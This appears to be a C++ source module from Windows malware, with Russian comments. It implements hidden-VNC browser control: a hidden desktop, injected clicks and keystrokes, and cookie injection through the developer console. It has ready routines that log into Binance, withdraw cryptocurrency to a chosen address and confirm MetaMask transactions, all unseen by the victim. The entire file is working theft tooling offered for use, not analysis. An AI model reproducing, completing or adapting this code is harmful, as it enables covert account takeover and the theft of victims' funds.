#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <memory>
#include <algorithm>
#include "../common.h"

extern void LogInfo(const char*);
extern void LogError(const char*);

// Внешние функции для HVNC
extern bool CreateHiddenDesktop();
extern void DestroyHiddenDesktop();
extern bool StartBrowserOnHiddenDesktop(const char*);
extern bool CaptureHiddenDesktopImage(uint8_t**, int*);
extern bool InjectMouseClickHVNC(int, int, bool);
extern bool InjectKeyboardInputHVNC(const char*);
extern bool InjectSpecialKeyHVNC(int, bool, bool, bool);

// Структура для команд HVNC
struct HVNCCommand {
    enum Type {
        OPEN_URL,
        CLICK_ELEMENT,
        TYPE_TEXT,
        KEY_COMBINATION,
        WAIT_FOR_ELEMENT,
        SCREENSHOT,
        INJECT_COOKIES,
        FILL_FORM
    };
    
    Type type;
    std::string parameter1;
    std::string parameter2;
    std::string parameter3;
    int x, y;
    bool completed;
    std::string result;
};

class HVNCSessionManager {
private:
    bool sessionActive;
    std::thread controlThread;
    std::mutex commandMutex;
    std::vector<HVNCCommand> commandQueue;
    std::string currentBrowserPath;
    HANDLE browserProcess;
    
public:
    HVNCSessionManager() : sessionActive(false), browserProcess(nullptr) {}
    
    ~HVNCSessionManager() {
        StopSession();
    }
    
    bool StartSession(const std::string& browserPath = "") {
        if (sessionActive) {
            LogInfo("HVNC сессия уже активна");
            return true;
        }
        
        // Создаем скрытый рабочий стол
        if (!CreateHiddenDesktop()) {
            LogError("Не удалось создать скрытый рабочий стол для HVNC");
            return false;
        }
        
        // Определяем путь к браузеру
        currentBrowserPath = browserPath.empty() ? DetectBrowserPath() : browserPath;
        
        if (currentBrowserPath.empty()) {
            LogError("Не удалось найти браузер для HVNC");
            return false;
        }
        
        // Запускаем браузер на скрытом рабочем столе
        if (!StartBrowserOnHiddenDesktop(currentBrowserPath.c_str())) {
            LogError("Не удалось запустить браузер на скрытом рабочем столе");
            return false;
        }
        
        sessionActive = true;
        
        // Запускаем поток управления
        controlThread = std::thread(&HVNCSessionManager::ControlLoop, this);
        
        LogInfo("HVNC сессия успешно запущена");
        
        return true;
    }
    
    void StopSession() {
        if (!sessionActive) return;
        
        sessionActive = false;
        
        if (controlThread.joinable()) {
            controlThread.join();
        }
        
        // Закрываем процесс браузера
        if (browserProcess) {
            TerminateProcess(browserProcess, 0);
            CloseHandle(browserProcess);
            browserProcess = nullptr;
        }
        
        // Уничтожаем скрытый рабочий стол
        DestroyHiddenDesktop();
        
        LogInfo("HVNC сессия остановлена");
    }
    
    bool ExecuteCommand(const HVNCCommand& command) {
        std::lock_guard<std::mutex> lock(commandMutex);
        commandQueue.push_back(command);
        return true;
    }
    
    bool OpenURL(const std::string& url) {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::OPEN_URL;
        cmd.parameter1 = url;
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    bool ClickAt(int x, int y) {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::CLICK_ELEMENT;
        cmd.x = x;
        cmd.y = y;
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    bool TypeText(const std::string& text) {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::TYPE_TEXT;
        cmd.parameter1 = text;
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    bool SendKeyCombo(const std::string& keys) {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::KEY_COMBINATION;
        cmd.parameter1 = keys;
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    bool TakeScreenshot(std::vector<uint8_t>& imageData) {
        uint8_t* data;
        int size;
        
        if (CaptureHiddenDesktopImage(&data, &size)) {
            imageData.assign(data, data + size);
            return true;
        }
        
        return false;
    }
    
    bool InjectCookies(const std::string& domain, const std::vector<std::string>& cookies) {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::INJECT_COOKIES;
        cmd.parameter1 = domain;
        cmd.parameter2 = JoinStrings(cookies, ";");
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    bool FillLoginForm(const std::string& username, const std::string& password, 
                      const std::string& usernameSelector = "", const std::string& passwordSelector = "") {
        HVNCCommand cmd;
        cmd.type = HVNCCommand::FILL_FORM;
        cmd.parameter1 = username;
        cmd.parameter2 = password;
        cmd.parameter3 = usernameSelector + "|" + passwordSelector;
        cmd.completed = false;
        
        return ExecuteCommand(cmd);
    }
    
    // Специализированные методы для конкретных сайтов
    bool LoginToBinance(const std::string& email, const std::string& password) {
        LogInfo("HVNC: Попытка входа в Binance");
        
        // Открываем Binance
        if (!OpenURL("https://www.binance.com/login")) {
            return false;
        }
        
        Sleep(3000); // Даем время загрузиться
        
        // Заполняем форму входа
        ClickAt(400, 300); // Поле email
        Sleep(500);
        TypeText(email);
        
        Sleep(500);
        ClickAt(400, 350); // Поле пароля
        Sleep(500);
        TypeText(password);
        
        Sleep(500);
        ClickAt(400, 400); // Кнопка входа
        
        return true;
    }
    
    bool PerformBinanceTransfer(const std::string& cryptocurrency, const std::string& amount, 
                               const std::string& destinationAddress) {
        LogInfo("HVNC: Выполнение перевода на Binance");
        
        // Переходим в раздел кошелька
        if (!OpenURL("https://www.binance.com/wallet/overview")) {
            return false;
        }
        
        Sleep(3000);
        
        // Нажимаем кнопку "Вывести"
        ClickAt(500, 200);
        Sleep(2000);
        
        // Выбираем криптовалюту
        TypeText(cryptocurrency);
        Sleep(1000);
        
        // Вводим адрес получателя
        ClickAt(400, 300);
        Sleep(500);
        TypeText(destinationAddress);
        
        // Вводим сумму
        ClickAt(400, 350);
        Sleep(500);
        TypeText(amount);
        
        // Подтверждаем
        ClickAt(400, 450);
        
        return true;
    }
    
    bool FillMetaMaskTransaction(const std::string& toAddress, const std::string& amount) {
        LogInfo("HVNC: Заполнение транзакции MetaMask");
        
        // Ожидаем появления попапа MetaMask
        Sleep(2000);
        
        // Заполняем поле адреса получателя
        ClickAt(300, 250);
        Sleep(500);
        
        // Очищаем поле и вводим новый адрес
        SendKeyCombo("Ctrl+A");
        Sleep(200);
        TypeText(toAddress);
        
        // Заполняем сумму
        ClickAt(300, 300);
        Sleep(500);
        SendKeyCombo("Ctrl+A");
        Sleep(200);
        TypeText(amount);
        
        // Нажимаем "Далее"
        ClickAt(300, 400);
        Sleep(2000);
        
        // Подтверждаем транзакцию
        ClickAt(300, 450);
        
        return true;
    }

private:
    void ControlLoop() {
        LogInfo("HVNC: Запущен цикл управления");
        
        while (sessionActive) {
            ProcessCommands();
            Sleep(100); // Небольшая задержка
        }
        
        LogInfo("HVNC: Цикл управления завершен");
    }
    
    void ProcessCommands() {
        std::lock_guard<std::mutex> lock(commandMutex);
        
        for (auto& cmd : commandQueue) {
            if (cmd.completed) continue;
            
            bool success = false;
            
            switch (cmd.type) {
                case HVNCCommand::OPEN_URL:
                    success = ProcessOpenURL(cmd);
                    break;
                    
                case HVNCCommand::CLICK_ELEMENT:
                    success = ProcessClick(cmd);
                    break;
                    
                case HVNCCommand::TYPE_TEXT:
                    success = ProcessTypeText(cmd);
                    break;
                    
                case HVNCCommand::KEY_COMBINATION:
                    success = ProcessKeyCombo(cmd);
                    break;
                    
                case HVNCCommand::SCREENSHOT:
                    success = ProcessScreenshot(cmd);
                    break;
                    
                case HVNCCommand::INJECT_COOKIES:
                    success = ProcessInjectCookies(cmd);
                    break;
                    
                case HVNCCommand::FILL_FORM:
                    success = ProcessFillForm(cmd);
                    break;
            }
            
            cmd.completed = success;
        }
        
        // Удаляем выполненные команды
        commandQueue.erase(
            std::remove_if(commandQueue.begin(), commandQueue.end(),
                          [](const HVNCCommand& cmd) { return cmd.completed; }),
            commandQueue.end()
        );
    }
    
    bool ProcessOpenURL(HVNCCommand& cmd) {
        // Открываем новую вкладку
        InjectSpecialKeyHVNC('T', true, false, false); // Ctrl+T
        
        Sleep(500);
        
        // Вводим URL
        InjectKeyboardInputHVNC(cmd.parameter1.c_str());
        
        Sleep(200);
        
        // Нажимаем Enter
        InjectSpecialKeyHVNC(VK_RETURN, false, false, false);
        
        return true;
    }
    
    bool ProcessClick(HVNCCommand& cmd) {
        return InjectMouseClickHVNC(cmd.x, cmd.y, true);
    }
    
    bool ProcessTypeText(HVNCCommand& cmd) {
        return InjectKeyboardInputHVNC(cmd.parameter1.c_str());
    }
    
    bool ProcessKeyCombo(HVNCCommand& cmd) {
        // Парсим комбинацию клавиш
        std::string keys = cmd.parameter1;
        bool ctrl = keys.find("Ctrl") != std::string::npos;
        bool alt = keys.find("Alt") != std::string::npos;
        bool shift = keys.find("Shift") != std::string::npos;
        
        int vk = VK_RETURN; // По умолчанию Enter
        
        if (keys.find("Tab") != std::string::npos) vk = VK_TAB;
        else if (keys.find("F5") != std::string::npos) vk = VK_F5;
        else if (keys.find("Esc") != std::string::npos) vk = VK_ESCAPE;
        
        return InjectSpecialKeyHVNC(vk, ctrl, alt, shift);
    }
    
    bool ProcessScreenshot(HVNCCommand& cmd) {
        // Этот метод будет обрабатываться отдельно через TakeScreenshot
        return true;
    }
    
    bool ProcessInjectCookies(HVNCCommand& cmd) {
        // Упрощенная реализация - открываем консоль разработчика
        InjectSpecialKeyHVNC(VK_F12, false, false, false); // F12
        
        Sleep(1000);
        
        // Переходим во вкладку Console
        InjectSpecialKeyHVNC(VK_TAB, false, false, false);
        Sleep(200);
        
        // Вводим JavaScript код для установки куки
        std::string cookieScript = "document.cookie = '" + cmd.parameter2 + "; domain=" + cmd.parameter1 + "';";
        
        InjectKeyboardInputHVNC(cookieScript.c_str());
        
        Sleep(200);
        InjectSpecialKeyHVNC(VK_RETURN, false, false, false);
        
        // Закрываем консоль
        Sleep(500);
        InjectSpecialKeyHVNC(VK_F12, false, false, false);
        
        return true;
    }
    
    bool ProcessFillForm(HVNCCommand& cmd) {
        // Простая реализация заполнения формы
        
        // Вводим username
        InjectKeyboardInputHVNC(cmd.parameter1.c_str());
        
        Sleep(200);
        
        // Переходим к следующему полю
        InjectSpecialKeyHVNC(VK_TAB, false, false, false);
        
        Sleep(200);
        
        // Вводим пароль
        InjectKeyboardInputHVNC(cmd.parameter2.c_str());
        
        return true;
    }
    
    std::string DetectBrowserPath() {
        // Ищем установленные браузеры
        std::vector<std::string> browserPaths = {
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
            "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
        };
        
        for (const auto& path : browserPaths) {
            if (GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                return path;
            }
        }
        
        return "";
    }
    
    std::string JoinStrings(const std::vector<std::string>& strings, const std::string& delimiter) {
        std::string result;
        for (size_t i = 0; i < strings.size(); ++i) {
            if (i > 0) result += delimiter;
            result += strings[i];
        }
        return result;
    }
};

// Глобальный менеджер сессий HVNC
static std::unique_ptr<HVNCSessionManager> g_hvncManager;

// Экспортные функции
extern "C" {
    bool StartHVNCSession(const char* browserPath) {
        try {
            g_hvncManager = std::make_unique<HVNCSessionManager>();
            
            std::string path = browserPath ? browserPath : "";
            bool success = g_hvncManager->StartSession(path);
            
            if (!success) {
                g_hvncManager.reset();
                return false;
            }
            
            LogInfo("HVNC сессия успешно запущена");
            return true;
            
        } catch (...) {
            LogError("Исключение при запуске HVNC сессии");
            g_hvncManager.reset();
            return false;
        }
    }
    
    void StopHVNCSession() {
        if (g_hvncManager) {
            g_hvncManager->StopSession();
            g_hvncManager.reset();
        }
    }
    
    bool HVNCOpenURL(const char* url) {
        if (!g_hvncManager) return false;
        return g_hvncManager->OpenURL(url);
    }
    
    bool HVNCClickAt(int x, int y) {
        if (!g_hvncManager) return false;
        return g_hvncManager->ClickAt(x, y);
    }
    
    bool HVNCTypeText(const char* text) {
        if (!g_hvncManager) return false;
        return g_hvncManager->TypeText(text);
    }
    
    bool HVNCKeyCombo(const char* keys) {
        if (!g_hvncManager) return false;
        return g_hvncManager->SendKeyCombo(keys);
    }
    
    bool HVNCTakeScreenshot(uint8_t** imageData, int* imageSize) {
        if (!g_hvncManager || !imageData || !imageSize) return false;
        
        static std::vector<uint8_t> screenshot;
        if (g_hvncManager->TakeScreenshot(screenshot)) {
            *imageData = screenshot.data();
            *imageSize = (int)screenshot.size();
            return true;
        }
        
        return false;
    }
    
    bool HVNCLoginToBinance(const char* email, const char* password) {
        if (!g_hvncManager) return false;
        return g_hvncManager->LoginToBinance(email, password);
    }
    
    bool HVNCBinanceTransfer(const char* crypto, const char* amount, const char* address) {
        if (!g_hvncManager) return false;
        return g_hvncManager->PerformBinanceTransfer(crypto, amount, address);
    }
    
    bool HVNCFillMetaMask(const char* toAddress, const char* amount) {
        if (!g_hvncManager) return false;
        return g_hvncManager->FillMetaMaskTransaction(toAddress, amount);
    }
    
    bool HVNCInjectCookies(const char* domain, const char** cookies, int cookieCount) {
        if (!g_hvncManager || !domain || !cookies) return false;
        
        std::vector<std::string> cookieVector;
        for (int i = 0; i < cookieCount; i++) {
            cookieVector.push_back(cookies[i]);
        }
        
        return g_hvncManager->InjectCookies(domain, cookieVector);
    }
    
    bool HVNCFillLoginForm(const char* username, const char* password) {
        if (!g_hvncManager) return false;
        return g_hvncManager->FillLoginForm(username, password);
    }
}

// Main wrapper function for StartHVNC
extern "C" {
    bool StartHVNC() {
        // Try starting HVNC with default browser
        return StartHVNCSession("chrome.exe");
    }
}